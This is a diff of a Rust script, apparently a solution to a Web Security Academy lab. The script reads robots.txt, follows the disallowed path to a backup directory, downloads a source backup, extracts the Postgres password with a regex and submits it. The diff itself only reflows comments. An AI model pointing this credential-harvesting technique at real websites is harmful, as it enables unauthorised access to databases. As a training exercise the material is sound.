@@ -30,75 +30,100 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
+    // change this to your lab URL
+    let url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
     println!(
         "{} {}",
         "1. Fetching the robots.txt file..".white(),
         "OK".green()
     );
-    let get_robots = client.get(format!("{url}/robots.txt")).send(); // check /robots.txt file
+
+    // check /robots.txt file
+    let get_robots = client.get(format!("{url}/robots.txt")).send();
+
+    // if response is OK
     if let Ok(res) = get_robots {
-        // if response is OK
-        let body = res.text().unwrap(); // get the body of the response
-                                        // println!("{}", body);
-        let hidden = capture_pattern("Disallow: (.*)", &body); // extract the hidden name
+        // get the body of the response
+        let body = res.text().unwrap();
+
+        // extract the hidden name
+        let hidden = capture_pattern("Disallow: (.*)", &body);
+
+        // if the href is found
         if let Some(text) = hidden {
-            // if the href is found
             println!(
                 "{} {} => {}",
                 "2. Searching for hidden files..".white(),
                 "OK".green(),
                 text.yellow()
             );
-            let backup = client.get(format!("{url}{text}")).send(); // fetch the backup directory
+
+            // fetch the backup directory
+            let backup = client.get(format!("{url}{text}")).send();
+
+            // if fetching is OK
             if let Ok(res) = backup {
-                // if fetching is OK
                 println!(
                     "{} {}",
                     "3. Fetching the backup directory..".white(),
                     "OK".green()
                 );
-                let body = res.text().unwrap(); // get the body of the backup directory
-                let backup_file = capture_pattern("href='(.*)'>", &body); // extract path to the backup file
+
+                // get the body of the backup directory
+                let body = res.text().unwrap();
+
+                // extract path to the backup file
+                let backup_file = capture_pattern("href='(.*)'>", &body);
+
+                // if the backup file is found
                 if let Some(text) = backup_file {
-                    // if the backup file is found
                     println!(
                         "{} {} => {}",
                         "4. Extracting the path to the backup file..".white(),
                         "OK".green(),
                         text.yellow()
                     );
-                    let get_backup = client.get(format!("{url}{text}")).send(); // GET the backup file
+
+                    // fetch the backup file
+                    let get_backup = client.get(format!("{url}{text}")).send();
+
+                    // if response is OK
                     if let Ok(res) = get_backup {
-                        // if response is OK
                         println!(
                             "{} {}",
                             "5. Fetching the backup file..".white(),
                             "OK".green()
                         );
+
+                        // get the body of the response
                         let body = res.text().unwrap();
+
+                        // try to extract the key
                         let key_pattern =
-                            capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body); // extract the key
+                            capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body);
+
+                        // if the key is found
                         if let Some(text) = key_pattern {
-                            // if the key is found
                             println!(
                                 "{} {} => {}",
                                 "6. Extracting key ..".white(),
                                 "OK".green(),
                                 text.yellow()
                             );
+
+                            // submit solution
                             let submit_answer = client
                                 .post(format!("{url}/submitSolution"))
                                 .form(&HashMap::from([("answer", text)]))
-                                .send(); // submit solution
+                                .send();
+
+                            // if submitting is successful
                             if let Ok(res) = submit_answer {
-                                println!(
-                                    "{} {}",
-                                    "7. Submitting solution..".white(),
-                                    "OK".green()
-                                );
+                                println!("{} {}", "7. Submitting solution..".white(), "OK".green());
                                 println!(
                                     "{} {}",
                                     "🗹 Check your browser, it should be marked now as"
